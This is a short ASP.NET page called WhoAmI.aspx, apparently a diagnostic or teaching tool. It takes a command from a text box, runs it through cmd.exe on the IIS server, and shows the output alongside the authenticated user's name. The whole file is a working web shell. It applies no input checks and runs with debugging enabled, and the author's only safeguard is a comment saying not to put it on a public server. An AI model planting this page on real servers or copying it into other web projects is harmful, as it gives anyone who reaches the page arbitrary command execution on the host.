<%@ Page Language="C#" Debug="true"%>
<% /*
    **********************************************************************
    *    Page: WhoAmI.aspx
    * Version: 1.2
    * Updated: 27.Nov.2007
    *  Author: Jason Fossen (www.EnclaveConsulting.com)
    *   Notes: Do NOT put this anywhere on your public IIS server!  
    *   Legal: Public domain. No rights reserved. Provided "AS IS" without 
    *          warranties or guarantees of any kind. Use at your own risk.
    ********************************************************************** 
*/ %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
    
    private string CaptureProcessOutput(string sCommand)
    {
        System.Diagnostics.ProcessStartInfo oProcessStartInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe");
        oProcessStartInfo.UseShellExecute = false;
        oProcessStartInfo.RedirectStandardOutput = true;
        oProcessStartInfo.Arguments = "/C " + sCommand + " 2>&1";

        System.Diagnostics.Process oProcess = System.Diagnostics.Process.Start(oProcessStartInfo);
        System.IO.StreamReader oReader = oProcess.StandardOutput;
        oProcess.Close();

        string sOut;
        sOut = oReader.ReadToEnd();
        oReader.Close();
        return sOut;
    }

    
    private void Page_Load(object sender, EventArgs e)
    {
        lblUser.Text = Page.Request.LogonUserIdentity.Name.ToString();
    }

    
    protected void btnClear_Click(object sender, EventArgs e)
    {
        tbxCommand.Text = "";
        tbxCommand.Focus();
    }
    
</script>


<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>Execute Commands</title>
</head>

<body onload="this.document.form1.tbxCommand.focus()">
    <br />

    <form id="form1" runat="server">
    <font color="Black" style="font-size: medium; font-weight: bold">User authenticated as: </font>
    <asp:Label ID="lblUser" runat="server" ForeColor="#D90000" Font-Bold="True" Font-Size="Large"></asp:Label><br /><br />

    <asp:TextBox ID="tbxCommand" runat="server" Text="" Width="400px" TabIndex="10" 
        ToolTip="Enter command to execute on IIS server." Font-Bold="True" 
        Font-Names="Courier New" BorderStyle="Ridge" ForeColor="#000099"></asp:TextBox>

    <asp:Button ID="btnExecute" runat="server" Text="Execute" TabIndex="20" />
    <asp:Button ID="btnClear" runat="server" Text="Clear" onclick="btnClear_Click" />
    
    

    <%        
    if (Page.IsPostBack && tbxCommand.Text.Length != 0)
    {
        string sOut = CaptureProcessOutput(tbxCommand.Text);
        sOut = sOut.Replace("<", "&lt;");   //<PRE> still processes tags, such
        sOut = sOut.Replace(">", "&gt;");   //as <DIR> in the output of 'dir'.
        Response.Write("<br /><br /><hr /><PRE>" + sOut + "</PRE>");
    }

    %>    

    </form>
</body>
</html>
